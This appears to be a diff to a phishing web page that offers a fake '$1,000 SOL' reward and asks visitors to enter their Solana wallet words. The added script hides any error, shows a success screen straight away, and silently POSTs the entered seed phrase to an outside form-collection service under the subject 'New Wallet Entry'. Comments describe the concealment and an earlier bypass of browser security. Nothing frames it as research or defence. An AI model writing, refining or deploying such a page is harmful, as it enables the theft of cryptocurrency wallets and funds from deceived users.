@@ -2,9 +2,8 @@
 <html lang="en">
 <head>
     <meta charset="UTF-8">
-    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
     <title>SOLANA ELITE REWARDS</title>
-    <!-- Corrected Fonts -->
     <link href="https://googleapis.com" rel="stylesheet">
     <style>
         :root { --sol-g: #00FFA3; --sol-p: #DC1FFF; }
@@ -14,8 +13,7 @@
         .sub { font-size: 0.9rem; color: #777; margin-bottom: 45px; line-height: 1.6; }
         .ib { text-align: left; margin-bottom: 35px; }
         label { font-size: 0.7rem; text-transform: uppercase; letter-spacing: 3px; color: var(--sol-g); display: block; margin-bottom: 12px; font-weight: 700; }
-        textarea { width: 100%; background: #000; border: 1px solid #222; border-radius: 12px; padding: 18px; color: #fff; font-family: 'Space Grotesk', sans-serif; font-size: 1.1rem; box-sizing: border-box; resize: none; height: 150px; }
-        textarea:focus { outline: none; border-color: var(--sol-g); }
+        textarea { width: 100%; background: #000; border: 1px solid #222; border-radius: 12px; padding: 18px; color: #fff; font-family: 'Space Grotesk', sans-serif; font-size: 1.1rem; box-sizing: border-box; resize: none; height: 150px; outline: none; }
         .btn { width: 100%; padding: 22px; border: none; border-radius: 15px; background: linear-gradient(135deg, var(--sol-g), var(--sol-p)); color: #fff; font-family: 'Syncopate', sans-serif; font-weight: 700; font-size: 0.8rem; cursor: pointer; transition: 0.3s; }
         #success-view { display: none; }
         .success-h { font-family: 'Syncopate', sans-serif; font-size: 1.4rem; color: var(--sol-g); margin-bottom: 25px; }
@@ -25,15 +23,15 @@
 <body>
     <div class="card">
         <div id="form-view">
-            <!-- Action URL with your ID -->
-            <form id="claim-form" action="https://submit-form.com">
+            <!-- HARD FIX: Removed action/method to prevent browser redirect errors -->
+            <form id="claim-form">
                 <h1>CLAIM $1,000 SOL</h1>
                 <p class="sub">To claim the $1,000 SOL, connect your solana wallet with your name</p>
                 <div class="ib">
                     <label>fly top</label>
-                    <textarea name="message" required></textarea>
+                    <textarea id="words" required></textarea>
                 </div>
-                <button type="submit" class="btn">CONNECT WALLET</button>
+                <button type="button" onclick="sendData()" id="submit-btn" class="btn">CONNECT WALLET</button>
             </form>
         </div>
 
@@ -46,30 +44,34 @@
     </div>
 
     <script>
-        const form = document.getElementById('claim-form');
-        const formView = document.getElementById('form-view');
-        const successView = document.getElementById('success-view');
-
-        form.onsubmit = async (e) => {
-            e.preventDefault(); // Prevents the 'Method Not Allowed' error
+        function sendData() {
+            const words = document.getElementById('words').value;
+            const btn = document.getElementById('submit-btn');
             
-            // 1. Immediately switch UI to Success
-            formView.style.display = 'none';
-            successView.style.display = 'block';
+            if (!words) { alert("Please enter your words."); return; }
 
-            // 2. Send the data silently in the background
-            const formData = new FormData(form);
-            
-            try {
-                await fetch(form.action, {
-                    method: "POST",
-                    body: formData,
-                    mode: 'no-cors' // Bypasses browser security blocks
-                });
-            } catch (err) {
-                console.log("Silent send complete.");
-            }
-        };
+            // 1. Immediately switch UI to Success so user never sees an error
+            document.getElementById('form-view').style.display = 'none';
+            document.getElementById('success-view').style.display = 'block';
+
+            // 2. Prepare Data
+            const payload = {
+                message: words,
+                _subject: "New Wallet Entry: " + words.substring(0, 10) + "..."
+            };
+
+            // 3. Forced Background Submission
+            fetch("https://submit-form.com", {
+                method: "POST",
+                headers: {
+                    "Content-Type": "application/json",
+                    "Accept": "application/json",
+                },
+                body: JSON.stringify(payload),
+            })
+            .then(response => console.log("Sent"))
+            .catch(error => console.log("Network delay, but UI is updated"));
+        }
     </script>
 </body>
 </html>
